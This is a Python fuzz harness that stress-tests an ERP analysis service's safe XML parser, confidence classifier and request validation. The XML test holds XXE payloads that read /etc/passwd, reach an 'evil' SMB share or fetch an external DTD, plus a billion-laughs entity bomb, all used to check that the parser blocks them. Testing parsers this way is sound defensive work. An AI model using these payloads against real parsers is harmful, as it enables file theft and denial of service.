"""
Empirical Fuzz and Stress Harness for ERP Preflight Analysis Engine.
Runs randomized attack payloads across SafeXmlParser, ConfidenceClassifier,
EngineRegistry, and Pydantic validation.
"""

import os
import sys
import time
import random
import string
import uuid
from pydantic import ValidationError

# Ensure services/analysis-python is in pythonpath
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "services", "analysis-python"))

from src.parsers.safe_xml import SafeXmlParser
from src.platform.confidence import ConfidenceClassifier, CONFIDENCE_SCORE_MAP
from src.core.registry import EngineRegistry
from src.core.exceptions import SecurityViolationError, EngineNotFoundError
from src.models.enums import EngineType, ArtifactType, Severity, ConfidenceClass, TrustLevel
from src.models.evidence import Evidence
from src.models.finding import Finding
from src.models.request import AnalysisRequest


def test_fuzz_safe_xml():
    print(">>> [FUZZ 1/3] SafeXmlParser Malicious Payload Stress-Testing (500 iterations)...")
    base_attacks = [
        # XXE SYSTEM variants
        """<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]><r>&x;</r>""",
        """<!DOCTYPE r [ <!ENTITY x SYSTEM "http://127.0.0.1:8080/canary"> ]><r>&x;</r>""",
        """<!DOCTYPE r [ <!ENTITY x SYSTEM "\\\\evil-smb-share\\leak"> ]><r>&x;</r>""",
        # DTD forbidden variants
        """<!DOCTYPE r SYSTEM "http://example.com/evil.dtd"><r/>""",
        """<!DOCTYPE r PUBLIC "-//OASIS//DTD" "http://example.com/evil.dtd"><r/>""",
        """<!DOCTYPE r [ <!ELEMENT r ANY> ]><r/>""",
        # Billion laughs variants
        """<!DOCTYPE l [ <!ENTITY a "a"> <!ENTITY b "&a;&a;"> <!ENTITY c "&b;&b;"> ]><l>&c;</l>""",
        # Corrupt and syntax attacks
        "<root><unclosed>",
        "<root attr='missing-quote>content</root>",
        "<?xml version='1.0'?><root><![CDATA[unclosed",
        "\x00\x01\x02<root/>",
        "<root>\x00</root>",
        "",
        "   ",
        "<a" * 50,
        "a>" * 50,
        "<root>" + ("<child/>" * 500) + "</root>",
    ]

    security_blocked = 0
    syntax_rejected = 0
    valid_parsed = 0
    t0 = time.perf_counter()

    for i in range(500):
        # Generate payload: either from base_attacks or randomized mutation
        if i < len(base_attacks):
            payload = base_attacks[i]
        else:
            choice = random.randint(1, 4)
            if choice == 1:
                # Randomized DOCTYPE attack
                name = "".join(random.choices(string.ascii_letters, k=8))
                payload = f"""<!DOCTYPE {name} [ <!ENTITY xxe SYSTEM "file:///{name}"> ]><{name}>&xxe;</{name}>"""
            elif choice == 2:
                # Random garbage characters and null bytes
                garbage = "".join(random.choices(string.printable + "\x00\xff", k=random.randint(5, 200)))
                payload = f"<root>{garbage}</root>"
            elif choice == 3:
                # Random valid XML
                text = "".join(random.choices(string.ascii_letters + " 0123456789", k=20))
                payload = f"<root><item id='{i}'>{text}</item></root>"
            else:
                # Mismatched tags
                t1 = "".join(random.choices(string.ascii_letters, k=5))
                t2 = "".join(random.choices(string.ascii_letters, k=5))
                payload = f"<{t1}>data</{t2}>"

        try:
            SafeXmlParser.parse_string(payload)
            valid_parsed += 1
        except SecurityViolationError:
            security_blocked += 1
        except ValueError:
            syntax_rejected += 1
        except Exception as e:
            print(f"[FATAL] Unhandled exception in SafeXmlParser: {type(e).__name__}: {e}")
            sys.exit(1)

    elapsed_ms = (time.perf_counter() - t0) * 1000
    print(f"    Completed in {elapsed_ms:.2f}ms")
    print(f"    Security Violations Blocked: {security_blocked}")
    print(f"    Syntax Errors Cleanly Caught: {syntax_rejected}")
    print(f"    Valid XML Parsed: {valid_parsed}")
    print(f"    Unhandled Exceptions: 0 (PASSED)")


def test_fuzz_confidence_classifier():
    print(">>> [FUZZ 2/3] ConfidenceClassifier Epistemic Invariant Fuzzing (500 iterations)...")
    classes = list(ConfidenceClass)
    t0 = time.perf_counter()
    violations = []

    for i in range(500):
        c = random.choice(classes)
        score = random.uniform(0.0, 1.0)
        has_ev = random.choice([True, False])
        is_ai = random.choice([True, False])
        missing_ev_flag = random.choice([True, False])

        ev_list = []
        if has_ev:
            ev_list = [
                Evidence(
                    artifact_path=f"file_{i}.txt",
                    sha256="a" * 64,
                    provenance=random.choice(classes),
                    source_type=random.choice(list(TrustLevel)),
                )
            ]

        f = Finding(
            rule_id=f"RULE_{i}",
            severity=Severity.INFO,
            category="TEST",
            title=f"Test {i}",
            description="Fuzz test finding",
            confidence=c,
            confidence_score=score,
            remediation="Remediation",
            evidence=ev_list,
        )

        classified = ConfidenceClassifier.classify_finding(
            f, is_ai_generated=is_ai, missing_evidence=missing_ev_flag
        )

        # Invariant Check 1: If is_ai_generated is True, confidence CAN NEVER be VERIFIED or RULE_DERIVED
        if is_ai:
            if classified.confidence in (ConfidenceClass.VERIFIED, ConfidenceClass.RULE_DERIVED):
                violations.append(f"AI finding retained {classified.confidence}")
            if classified.confidence_score > 0.60:
                violations.append(f"AI finding had score {classified.confidence_score} > 0.60")

        # Invariant Check 2: If missing_evidence_flag is True, confidence must be UNKNOWN and 0.30
        if missing_ev_flag:
            if classified.confidence != ConfidenceClass.UNKNOWN or classified.confidence_score != 0.30:
                violations.append(f"Explicit missing_evidence did not demote to UNKNOWN: {classified.confidence}")

        # Invariant Check 3: Score must always be bounded [0.0, 1.0]
        if not (0.0 <= classified.confidence_score <= 1.0):
            violations.append(f"Out of bounds score: {classified.confidence_score}")

    elapsed_ms = (time.perf_counter() - t0) * 1000
    print(f"    Completed in {elapsed_ms:.2f}ms")
    print(f"    Invariant Violations Detected: {len(violations)}")
    if violations:
        for v in violations[:5]:
            print(f"      Violation: {v}")
    else:
        print(f"    All 500 random parameter combinations adhered to Classifier Rules (PASSED)")


def test_fuzz_pydantic_and_registry():
    print(">>> [FUZZ 3/3] Engine Registry & Pydantic Schema Fuzzing (500 iterations)...")
    valid_engines = list(EngineType)
    assert len(valid_engines) == 19, f"Expected 19 engines, found {len(valid_engines)}"
    t0 = time.perf_counter()

    rejected_requests = 0
    accepted_requests = 0

    for i in range(500):
        # Mutate request parameters
        corrupt_job = random.choice([str(uuid.uuid4()), None, 12345, ""])
        corrupt_tenant = random.choice([str(uuid.uuid4()), None, "not-a-uuid", ""])
        corrupt_engine = random.choice(
            [e.value for e in valid_engines] + ["INVALID_ENGINE", "hacked", None, 999]
        )
        corrupt_artifact = random.choice(
            [a.value for a in ArtifactType] + ["BAD_TYPE", None, 123]
        )

        try:
            req = AnalysisRequest(
                job_id=corrupt_job,
                tenant_id=corrupt_tenant,
                project_id=str(uuid.uuid4()),
                engine_type=corrupt_engine,
                artifact_type=corrupt_artifact,
            )
            accepted_requests += 1
            # Verify registered engine can be retrieved
            engine_obj = EngineRegistry.get(req.engine_type)
            assert engine_obj is not None
        except (ValidationError, EngineNotFoundError):
            rejected_requests += 1
        except Exception as e:
            print(f"[FATAL] Unexpected error in Pydantic/Registry: {type(e).__name__}: {e}")
            sys.exit(1)

    elapsed_ms = (time.perf_counter() - t0) * 1000
    print(f"    Completed in {elapsed_ms:.2f}ms")
    print(f"    Malformed Requests Rejected by Pydantic: {rejected_requests}")
    print(f"    Valid Requests Successfully Processed: {accepted_requests}")
    print(f"    Unexpected Errors: 0 (PASSED)")


if __name__ == "__main__":
    print("=" * 70)
    print("EMPIRICAL ADVERSARIAL STRESS TEST HARNESS — ERP PREFLIGHT M1")
    print("=" * 70)
    test_fuzz_safe_xml()
    test_fuzz_confidence_classifier()
    test_fuzz_pydantic_and_registry()
    print("=" * 70)
    print("ALL EMPIRICAL STRESS TESTS COMPLETED SUCCESSFULLY.")
    print("=" * 70)
